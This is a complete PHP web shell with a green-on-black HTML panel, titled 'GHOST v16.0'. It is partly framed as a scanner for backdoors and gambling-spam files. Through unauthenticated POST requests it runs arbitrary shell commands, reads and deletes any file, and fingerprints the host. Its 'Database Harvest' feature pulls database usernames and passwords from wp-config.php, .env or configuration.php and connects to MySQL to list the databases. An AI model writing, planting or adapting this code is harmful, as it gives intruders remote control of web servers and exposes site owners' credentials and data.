<?php
/**
 * GHOST v16.0 — Zero-Crash Engine
 */
@ob_start();
error_reporting(0);
ini_set('display_errors', '0');
set_time_limit(0);
ignore_user_abort(true);

$GHOST_ROOT = @realpath($_SERVER['DOCUMENT_ROOT'] ?? getcwd()) ?: getcwd();

// ==========================================
// SAFE ENGINE
// ==========================================
function g_exec($cmd, $timeout = 5) {
    $cmd = "timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1";
    foreach (['shell_exec','system','passthru','exec','popen'] as $m) {
        if (!function_exists($m)) continue;
        try {
            if ($m === 'shell_exec') { $out = @shell_exec($cmd); if ($out !== null) return $out; }
            if ($m === 'system') { ob_start(); @system($cmd); $out = ob_get_clean(); if ($out) return $out; }
            if ($m === 'passthru') { ob_start(); @passthru($cmd); $out = ob_get_clean(); if ($out) return $out; }
            if ($m === 'exec') { $o=[]; @exec($cmd, $o); if ($o) return implode("\n", $o); }
            if ($m === 'popen') { $f=@popen($cmd,'r'); if($f){$r='';while(!feof($f))$r.=fread($f,8192);pclose($f);return $r;} }
        } catch (Throwable $e) { continue; }
    }
    return "[-] Blocked.";
}

function g_read($path) {
    if (!@is_file($path) || @filesize($path) === 0) return "";
    try {
        if (function_exists('file_get_contents')) { $d = @file_get_contents($path); if ($d !== false) return $d; }
        return g_exec('cat ' . escapeshellarg($path));
    } catch (Throwable $e) { return ""; }
}

// ==========================================
// SAFE SCANNER (Tanpa Iterator yang Berat)
// ==========================================
function g_scan_batch($dir, $offset = 0, $limit = 30) {
    $res = ['files'=>[], 'done'=>false, 'total'=>0];
    $ignore = ['jpg','jpeg','png','gif','mp4','mp3','pdf','zip','tar','gz','sqlite','svg','ico','woff','ttf','eot'];
    $all_files = [];
    
    // Menggunakan scandir rekursif manual alih-alih RecursiveIteratorIterator
    $stack = [$dir];
    while ($stack) {
        $current = array_pop($stack);
        $files = @scandir($current);
        if ($files === false) continue;
        foreach ($files as $f) {
            if ($f === '.' || $f === '..') continue;
            $path = $current . '/' . $f;
            if (@is_dir($path) && !@is_link($path)) { $stack[] = $path; }
            elseif (@is_file($path)) {
                if (in_array(strtolower(pathinfo($f, PATHINFO_EXTENSION)), $ignore)) continue;
                $all_files[] = $path;
            }
        }
    }

    $batch = array_slice($all_files, $offset, $limit);
    $res['done'] = ($offset + count($batch)) >= count($all_files);
    $res['total'] = count($all_files);
    $illegal_kw = ['slot','gacor','togel','judi','maxwin','bokep','porno','xxx','scam','phising'];
    
    foreach ($batch as $path) {
        $c = g_read($path); $size = @filesize($path); $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
        $findings = []; $type = '';
        
        if ($size === 0 && $ext === 'php') { $type='Empty Shell'; $findings[]="File 0 byte."; }
        elseif (stripos($c, 'eval(') !== false) { $type='RCE Backdoor'; $findings[]="Fungsi eval()."; }
        elseif (preg_match('/(shell_exec|passthru|system)\s*\(\s*\$_/', $c)) { $type='Direct Shell'; $findings[]="Eksekusi shell."; }
        elseif (!$ext && stripos($c, '<?php') !== false) { $type='Hidden PHP'; $findings[]="File tanpa ekstensi."; }
        
        $found_kw = [];
        foreach ($illegal_kw as $k) { if (stripos($c, $k) !== false) $found_kw[] = $k; }
        if ($found_kw) { if($type==='') $type='Illegal Content'; $findings[]="Keyword: ".implode(',', $found_kw); }

        if ($type !== '') $res['files'][] = ['path'=>$path, 'type'=>$type, 'desc'=>implode(' | ', $findings)];
    }
    return $res;
}

// ==========================================
// SAFE DB HARVEST
// ==========================================
function g_db_harvest() {
    $logs = []; $info = [];
    try {
        foreach (['wp-config.php', '.env', 'configuration.php'] as $cf) {
            if (@is_file($GLOBALS['GHOST_ROOT']."/$cf")) {
                $c = g_read($GLOBALS['GHOST_ROOT']."/$cf");
                preg_match('/(?:DB_USER|username)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $u);
                preg_match('/(?:DB_PASSWORD|password)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $p);
                if ($u[1] && $p[1]) { $logs[] = "[+] Config $cf"; $info = ['user'=>$u[1], 'pass'=>$p[1]]; break; }
            }
        }
        
        if (!empty($info['user'])) {
            $logs[] = "[*] Connecting to MySQL...";
            // Tambahkan timeout koneksi (2 detik)
            $conn = @mysqli_connect('localhost', $info['user'], $info['pass'], '', 3306, null, ['connect_timeout' => 2]);
            if ($conn) {
                $logs[] = "[!] Connected!";
                $q = @mysqli_query($conn, "SHOW DATABASES");
                if ($q) { while($r = mysqli_fetch_array($q)) { $logs[] = $r[0]; } }
            } else { $logs[] = "[-] Gagal: " . mysqli_connect_error(); }
        } else {
            $logs[] = "[-] Config tidak ditemukan di folder root.";
        }
    } catch (Throwable $e) {
        $logs[] = "[-] Catch Error: " . $e->getMessage();
    }
    return ['logs'=>$logs, 'info'=>$info];
}

// ==========================================
// SAFE ROUTER
// ==========================================
$act = $_POST['act'] ?? '';
if ($act) {
    while (ob_get_level() > 0) ob_end_clean();
    header('Content-Type: application/json');
    try {
        if ($act === 'fingerprint') echo json_encode(['OS'=>trim(g_exec('uname -a')), 'User'=>trim(g_exec('whoami')), 'cPanel'=>'Check Port']);
        elseif ($act === 'scan') echo json_encode(g_scan_batch($GHOST_ROOT, (int)$_POST['offset'], 30));
        elseif ($act === 'db_scan') echo json_encode(g_db_harvest());
        elseif ($act === 'read_file') echo json_encode(['content'=>g_read($_POST['path'])]);
        elseif ($act === 'del_file') echo json_encode(['status'=>@unlink($_POST['path'])?'ok':'fail']);
        elseif ($act === 'exec') echo json_encode(['out'=>g_exec($_POST['cmd']??'')]);
    } catch (Throwable $e) {
        echo json_encode(['err' => 'FATAL CATCH: ' . $e->getMessage()]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>GHOST v16.0</title>
<style>
    body { background:#0a0a0a; color:#0f0; font-family:monospace; padding:20px; }
    .box { border:1px solid #0f0; padding:15px; margin-bottom:15px; background:#111; }
    input, button { background:#000; color:#0f0; border:1px solid #0f0; padding:8px; font-family:monospace; margin-bottom:5px; }
    button { cursor:pointer; font-weight:bold; }
    button:hover { background:#0f0; color:#000; }
    pre { background:#000; padding:10px; border:1px solid #333; max-height:300px; overflow:auto; white-space:pre-wrap; font-size:12px; }
    table { width:100%; border-collapse:collapse; margin-top:10px; font-size:12px; }
    th,td { border:1px solid #333; padding:8px; text-align:left; }
    th { background:#222; color:#0f0; }
    .badge { background:#500; color:#f00; padding:2px 5px; border-radius:3px; font-size:10px; font-weight:bold; }
    .btn-red { border-color:#f00; color:#f00; }
    .btn-red:hover { background:#f00; color:#000; }
    #modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:999; }
    #modal-content { background:#000; border:1px solid #0f0; margin:10% auto; padding:20px; width:80%; max-height:80%; overflow:auto; }
</style>
</head>
<body>
<div id="modal"><div id="modal-content"><pre id="modal-text"></pre><br><button onclick="document.getElementById('modal').style.display='none'">Close</button></div></div>

<div class="box">
    <h2>[+] Fingerprinting</h2>
    <button onclick="run('fingerprint','out-fp')">Scan Profile</button>
    <pre id="out-fp">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Deep Inspector</h2>
    <button onclick="startScan()">Scan Semua File</button>
    <div id="scan-status" style="margin-top:10px; color:#ff0;">Idle.</div>
    <div id="scan-results"></div>
</div>

<div class="box">
    <h2>[+] Database Harvest</h2>
    <button onclick="run('db_scan','db-result')">Scan DB (Anti-Crash)</button>
    <pre id="db-result">Waiting...</pre>
</div>

<div class="box">
    <h2>[+] Console</h2>
    <input type="text" id="cmd" placeholder="whoami / help" style="width:80%;">
    <button onclick="execCmd()">Exec</button>
    <pre id="out-exec">Ketik 'help' untuk perintah.</pre>
</div>

<script>
function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
async function api(act, params={}) {
    const body = new URLSearchParams(); body.append('act',act);
    for (let k in params) body.append(k, params[k]);
    const r = await fetch('', {method:'POST', body});
    const text = await r.text();
    try { return JSON.parse(text); } 
    catch(e) { return {err: "Server crash / timeout. HTTP "+r.status}; }
}

async function run(act, target) {
    document.getElementById(target).innerText = 'Running...';
    try {
        const d = await api(act);
        if (d.err) { document.getElementById(target).innerText = 'Error: ' + d.err; return; }
        document.getElementById(target).innerText = JSON.stringify(d,null,2);
    } catch(e) { document.getElementById(target).innerText = 'Error: '+e.message; }
}

async function startScan() {
    let offset = 0; let mal = [];
    document.getElementById('scan-results').innerHTML = '';
    document.getElementById('scan-status').innerText = 'Memulai...';

    while (true) {
        document.getElementById('scan-status').innerText = `Menganalisa file ke-${offset}...`;
        try {
            const d = await api('scan', {offset: offset});
            if (d.err) { document.getElementById('scan-status').innerText = 'Error: ' + d.err; break; }
            d.files.forEach(f => mal.push(f));
            if (d.done) {
                document.getElementById('scan-status').innerText = `Selesai! Ditemukan ${mal.length} file dari total ${d.total} file.`;
                renderScan(mal); break;
            }
            offset += 30;
        } catch(e) { document.getElementById('scan-status').innerText = 'Error: ' + e.message; break; }
    }
}

function renderScan(mal) {
    if (!mal.length) { document.getElementById('scan-results').innerHTML = '<p style="color:#0f0;">File Bersih.</p>'; return; }
    let h = `<table><tr><th>Klasifikasi</th><th>File</th><th>Analisis</th><th>Aksi</th></tr>`;
    mal.forEach(x => {
        h += `<tr><td><span class="badge">${esc(x.type)}</span></td><td>${esc(x.path)}</td><td>${esc(x.desc)}</td>
            <td><button onclick="viewFile('${encodeURIComponent(x.path)}')">View</button>
            <button class="btn-red" onclick="delFile('${encodeURIComponent(x.path)}')">Delete</button></td></tr>`;
    });
    h += `</table>`;
    document.getElementById('scan-results').innerHTML = h;
}

async function viewFile(enc) {
    document.getElementById('modal').style.display = 'block';
    document.getElementById('modal-text').innerText = 'Loading...';
    const d = await api('read_file', {path: decodeURIComponent(enc)});
    document.getElementById('modal-text').innerText = d.content ? d.content.slice(0, 5000) : 'Error/Gagal membaca file.';
}

async function delFile(enc) {
    if(!confirm('Hapus file ini?')) return;
    await api('del_file', {path: decodeURIComponent(enc)});
    startScan();
}

async function execCmd() {
    const c = document.getElementById('cmd').value;
    if(!c) return;
    document.getElementById('out-exec').innerText = '$ '+c+'\nRunning...';
    const d = await api('exec',{cmd:c});
    document.getElementById('out-exec').innerText = '$ '+c+'\n\n'+(d.out || d.err);
}
</script>
</body>
</html>
